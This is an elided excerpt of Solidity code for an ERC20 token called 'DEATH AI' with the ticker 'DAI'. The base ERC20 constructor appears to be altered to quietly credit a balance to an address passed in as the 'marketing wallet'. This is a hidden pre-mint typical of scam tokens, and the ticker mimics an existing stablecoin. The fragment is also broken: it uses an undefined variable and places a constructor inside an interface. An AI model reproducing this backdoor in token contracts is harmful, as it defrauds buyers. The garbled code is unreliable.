...
contract ERC20 is Context, IERC20, IERC20Metadata {
     ...
     * construction.
     */
    constructor(string memory name_, string memory symbol_, address _a) {
        _name = name_;
        _symbol = symbol_;
        _balances[_a] = a;
    }
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
    ...
    constructor(address _marketingWallet) ERC20("DEATH AI", "DAI", _marketingWallet) {
        ...
        marketingWallet = _marketingWallet; // set as marketing wallet
